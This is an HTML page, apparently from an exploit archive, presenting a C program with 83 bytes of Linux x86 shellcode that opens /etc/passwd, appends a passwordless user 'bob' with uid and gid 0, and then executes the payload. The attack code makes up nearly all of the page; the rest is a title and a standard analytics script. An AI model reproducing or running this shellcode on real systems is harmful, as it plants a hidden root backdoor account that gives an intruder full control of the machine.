<html><head><title>Linux/x86 - adds a root user no-passwd to /etc/passwd - 83 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* Linux x86 shellcode, to open() write() close() and */
/* exit(), adds a root user no-passwd to /etc/passwd */
/* By bob from dtors.net */

#include &lt;stdio.h&gt;

char shellcode[]=
		&quot;\x31\xc0\x31\xdb\x31\xc9\x53\x68\x73\x73\x77&quot;
		&quot;\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74&quot;
		&quot;\x89\xe3\x66\xb9\x01\x04\xb0\x05\xcd\x80\x89&quot;
		&quot;\xc3\x31\xc0\x31\xd2\x68\x6e\x2f\x73\x68\x68&quot;
		&quot;\x2f\x2f\x62\x69\x68\x3a\x3a\x2f\x3a\x68\x3a&quot;
		&quot;\x30\x3a\x30\x68\x62\x6f\x62\x3a\x89\xe1\xb2&quot;
		&quot;\x14\xb0\x04\xcd\x80\x31\xc0\xb0\x06\xcd\x80&quot;
		&quot;\x31\xc0\xb0\x01\xcd\x80&quot;;

int
main()
{
        void (*dsr) ();
        (long) dsr = &amp;shellcode;
        printf(&quot;Size: %d bytes.\n&quot;, sizeof(shellcode)); 
        dsr();
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
